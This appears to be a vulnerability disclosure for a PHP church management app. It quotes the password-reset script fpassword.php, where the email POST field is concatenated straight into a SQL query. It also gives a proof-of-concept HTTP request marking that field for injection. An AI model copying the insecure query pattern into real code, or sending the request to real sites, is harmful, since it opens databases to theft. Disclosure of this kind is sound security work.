### Vulnerability file address

`church/fpassword.php` from line 27,The `$_POST['email']` parameter is controllable and the `$_POST['email']` is not protected from sql injection, line 29 `$sql="SELECT * FROM login WHERE email='".$text_email."'";` ,line 32 `$ans->execute();` performs a SQL query, causing SQL injection

```php
<?php 

session_start();
// error_reporting(0);

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;


require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';
require 'PHPMailer/src/Exception.php';
// require '../../PHPMailer/src/Autoload.php';

 include("assets/constant/config.php");
 

 try {
        $conn = new PDO("mysql:host=$servername;dbname=$dbname", $username, $password);
        $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);


if(isset($_POST['submit'])){

  $otp=substr(str_shuffle(str_repeat("0123456789abcdefghijklmnopqrstuvwxyz", 8)),0,8);
  $text_email=$_POST['email'];

  $sql="SELECT * FROM login WHERE email='".$text_email."'";
// print_r($sql);
  $ans=$conn->prepare($sql);
  $ans->execute();
  $res=$ans->fetch();
```

### POC

```http
POST /church/fpassword.php HTTP/1.1
Host: www.church.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: PHPSESSID=kecn6qqrggjnvlpgliqeq951j0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 2

submit=1&email=*
```

### Attack results pictures

![image-20250220213143519](https://raw.githubusercontent.com/nixuchuan/imgs/main/202502202138127.png)